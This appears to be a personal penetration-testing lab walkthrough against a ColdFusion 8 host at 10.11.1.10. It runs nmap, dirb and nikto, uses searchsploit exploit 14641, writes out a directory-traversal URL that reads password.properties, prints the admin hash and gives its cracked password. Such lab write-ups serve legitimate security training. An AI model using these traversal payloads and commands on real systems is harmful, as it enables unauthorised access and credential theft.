Enumeration

Enumeration

# NMAP
## TCP Ports
### sudo nmap -Pn -p- 10.11.1.10
![b92e64a728aa058c4b5febbe5a0e419f.png](../../_resources/3fc3d4e1e6c14707860014985312cf6c.png)


# dirb
Non-recursive scan
### dirb http://10.11.1.10 -r
![98dda4b9588d5a0540d259886ea6d092.png](../../_resources/0aa9bda96ea74282a6d6e1c835be0437.png)

Recursive scan on the ColdFusion administrator link
### dirb http://10.11.1.10/CFIDE/administrator/
![5ddc04f72da2ffefece02756d716c513.png](../../_resources/174dc093aa6548fcb725b0a3854b76dc.png)


# Nikto
![eefe619c3d685418d98d47267130281c.png](../../_resources/e366bbd24d614977950cdb209ca3efb6.png)

# Searchsploit
Search for ColdFusion
![2e67ff55f9c36f2d567b76298dfaf193.png](../../_resources/0d9450d4cac0424f89c53547e59f07b4.png)

## Directory Traversal, exploit 14641
After examining the Directory Traversal exploit 14641 (-x switch), download it.
![3e57c568b5e3f1bd024c86bc67f0becb.png](../../_resources/59dad30f089a4c7193eef53a2d6610d7.png)

This is the exploit code for 14641
[14641.py](../../_resources/411c5cb7d09b473a9f8c5977f1552776.py)

The usage for 14641.py
![bc6ddb1276e12e02a04cf96b91e132c3.png](../../_resources/cd01eb8a9c07496091bccb7c1424117a.png)

Within the exploit,a string a working string is specified
### http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
![b2a8db76f9a75cd8989dfc9c467b1455.png](../../_resources/7d87a6751b1a43b4a68a442c2e67615b.png)

Run exploit on the CLI. Ensure to use the target IP
### python 14641.py 10.11.1.10 80 ../../../../../../../../../../ColdFusion8/lib/password.properties%00en
![d69d92157b69f1e4e7eda0c33ca7593d.png](../../_resources/d44c5551aae94cb7bbed9c3366ce22c1.png)

Run the exploit on the browser as well
### http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
![cf8_passwd.png](../../_resources/fce1ee7db2b341b7a3b9d4dd8ce48813.png)

The Administrator has is found: 
### AAFDC23870ECBCD3D557B6423A8982134E17927E

# Crackstation

Crack the ColdFusion 8 'admin' password hash. Password is: pass123
![53f0079156bedae8e1bdb0175a5c8c3e.png](../../_resources/b0078eca3c04478caaa5bd23e33a6d7b.png)



# Other Tools
